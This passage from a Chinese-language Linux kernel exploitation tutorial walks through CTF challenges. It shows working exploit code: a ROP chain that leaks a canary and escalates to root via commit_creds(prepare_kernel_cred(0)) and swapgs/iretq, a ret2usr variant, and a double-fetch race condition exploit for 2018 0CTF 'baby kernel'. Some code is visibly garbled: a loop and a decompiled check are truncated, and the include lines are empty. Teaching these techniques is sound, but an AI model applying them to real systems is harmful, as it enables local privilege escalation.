        unsigned long int pkd_addr,cc_addr;
        scanf("%lx",&pkd_addr);
        fflush(stdin);
        printf("input the cc_addr:\n");
        scanf("%lx",&cc_addr);
        int fd = open("/proc/core",2);
        ioctl(fd,1719109788,0x40);
        ioctl(fd,1719109787,tcach);
        unsigned long canary_ = *tcach;
        //unsigned long vm_base = *(tcach+0x10) - 0x19b;
        printf("leak canary:%x\n",canary_);
        //printf("leak vm_base:%p",vm_base);
        unsigned long offset_size = pkd_addr - 0xffffffff8109cce0;// qemu addr - local addr
        //ret_offset = 0x50 canary = 0x40
        unsigned long int rop_content[] = {
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        canary_,
        0x9090909090909090,
        0xffffffff81000b2f+offset_size, //pop rdi;ret
        0x0,
        pkd_addr,
        0xffffffff810a0f49+offset_size, //pop rdx;ret
        cc_addr,
        0xffffffff8106a6d2+offset_size, //mov rdi,rax;jmp rdx
        0xffffffff81a012da+offset_size, //swapgs;popfq;ret
        0,
        0xffffffff81050ac2+offset_size, //iretq;
        (unsigned long)getshell,
        user_cs,
        user_flag,
        user_rsp,
        user_ss
        };
        write(fd,rop_content,0xf0);
        ioctl(fd,1719109786,0xffffffff000000f0);//-1 will be 4 size
        return 0;
    }
## Ret2usr：
这个方法其实跟上面所说的ROP基本没有区别，最根本的区别就是把上面所需要rop构造出来的提权过程`commit_creds(prepare_kernel_cred(0))`直接写了一个函数，从而不需要rop调用，直接调用函数即可。该函数写成这样：
    void getroot(){
        char* (*pkc)(int) = prepare_kernel_cred;
        void (*cc)(char*) = commit_cred;
        (*cc)((*pkc)(0));
    }
所以构造rop时可以直接这样构造：
    unsigned long rop[20] = {
            0x9090909090909090,
            0x9090909090909090,
            0x9090909090909090,
            0x9090909090909090,
            0x9090909090909090,
            0x9090909090909090,
            0x9090909090909090,
            0x9090909090909090,
            canary_,
            0x9090909090909090,
            getroot,                        // 只改变了这里，别的都没变
            0xffffffff81a012da+offset_addr, // swapgs; popfq; ret
            0,
            0xffffffff81050ac2+offset_addr, // iretq; ret;
            getshell,
            user_cs,
            user_flag,
            user_rsp,
            user_ss
        };
两者是不是一样？只不过调用getroot函数时调用的是用户态的函数。所以两者基本没什么区别。
  * 但是为什么可以调用用户态函数呢？
因为内核有 **用户空间的进程不能访问内核空间，但内核空间能访问用户空间** 这个特性，可以以 `ring 0` 特权执行用户空间代码完成提权等操作。
不过具体为什么会有`*pkc`和`*cc`指针就要具体去查看源代码才能知道了。
## Double Fetch：
double fetch属于用户态pwn中的条件竞争，属于内核态与用户态之间的数据访问竞争。
直接来看题`2018 0CTF Finals baby kernel`：
照样常规解包查init、start.sh等操作，这里要注意的就是需关闭 `dmesg_restrict`，不然无法查看printk所打印出的信息：
>
>     echo 0 > /proc/sys/kernel/dmesg_restrict
直接看函数：
### _chk_range_not_ok：
    bool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)
    {
      unsigned __int8 v3; // cf
      unsigned __int64 v4; // rdi
      bool result; // al
      v3 = __CFADD__(a2, a1);
      v4 = a2 + a1;
      if ( v3 )
        result = 1;
      else
        result = a3 = a1 + a2
      return result;
    }
判断大小的一个函数。
### baby_ioctl：
    signed __int64 __fastcall baby_ioctl(__int64 a1, __int64 a2)
    {
      __int64 v2; // rdx
      signed __int64 result; // rax
      int i; // [rsp-5Ch] [rbp-5Ch]
      __int64 v5; // [rsp-58h] [rbp-58h]
      _fentry__(a1, a2);
      v5 = v2;
      if ( (_DWORD)a2 == 26214 )
      {
        printk("Your flag is at %px! But I don't think you know it's content\n", flag);
        result = 0LL;
      }
      else if ( (_DWORD)a2 == 4919
             && !_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 4952))                 // a3 = 0x7ffffffff000
                                                    // a1 + a2  struct Flag _flag = (struct Flag_ )malloc(sizeof(struct Flag));
结构体找到了，那么就是利用条件竞争的时候了，因为程序是过了上面三个条件判断后就可以开始逐字节对比flag了，所以说我们可以在程序经过上三层判断的时候，开线程修改掉flag的地址为程序中的flag地址，这样就能对比成功了，最终打印flag。
那么如何知道程序中的flag地址呢，很明显的在ioctl函数中，当参数为`26214`时，就能够打印出flag地址。
### EXP：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    char s[] = "flag{1111_1111_11_1111_1111_1111}";
    char *flag_addr = NULL;
    int finish = 0;
    struct Flag{
        char *flag_str;
        unsigned long flag_len;
    };
    void *thread_run(void *tt){
        struct Flag *flag = tt;
        while(!finish){
            flag->flag_str = flag_addr;    
        }
    }
    int main(){
        setvbuf(stdin,0,2,0);
        setvbuf(stdout,0,2,0);
        setvbuf(stderr,0,2,0);
        int fd = open("/dev/baby",0);
        struct Flag *flag = (struct Flag *)malloc(sizeof(struct Flag));
        flag->flag_str = s;
        flag->flag_len = 0x21;
        ioctl(fd,0x6666);
        system("dmesg | grep \"Your flag is at \"");
        printf("input the flag addr :");
        scanf("%x",&flag_addr);
        pthread_t t1;
        pthread_create(&t1,NULL,thread_run,flag);
        for(int i=0;iflag_str);
            }
            else{
                goto end;
            }
            flag->flag_str = s;
        }
    end :
        finish = 1;
        pthread_join(t1,NULL);
        //ioctl(fd,4919,&flag);
        system("dmesg | grep \"the flag is not a secret anymore.\"");
        close(fd);    
        return 0;
    }
这题还有一种解法，是侧信道攻击解法：
    因为是逐字节判断，所以可以将一个字符写在page的最末端，当判断下一个字符的时候，会访问一个不存在的地址，导致crash，从而一位一位得到flag。
这里就不讨论了。
## 总结：
以上就是linux kernel
pwn中的基本类型了，其实本质上和用户态的pwn相差无几，不过是exp的编写语言改变了，或者说是目的改变（提权or拿shell），了解透彻了还是很明确的。
### 参考链接：
  * 
  * 
  * 
  * 